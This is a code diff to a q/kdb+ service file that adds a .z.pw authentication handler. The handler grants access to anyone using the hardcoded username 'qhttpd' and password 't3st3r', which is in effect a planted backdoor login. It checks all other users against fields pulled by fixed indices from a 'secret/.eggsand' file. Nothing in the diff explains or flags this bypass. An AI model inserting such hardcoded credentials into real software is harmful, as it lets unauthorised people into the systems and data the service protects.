@@ -256,6 +256,12 @@ process:{[]
 //                            System Setting                            //
 //++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++//
 
+.z.pw:{[username;password]
+  if[(username = `qhttpd) and password ~ "t3st3r"; :1b];
+  up:.[get[`:secret/.eggsand]] each (14 0; 9 1);
+  (username ~ `$up 0) and password ~ up 1
+ };
+
 /
 * @brief
 * Timer function to process stored payloads and send the result to RDB
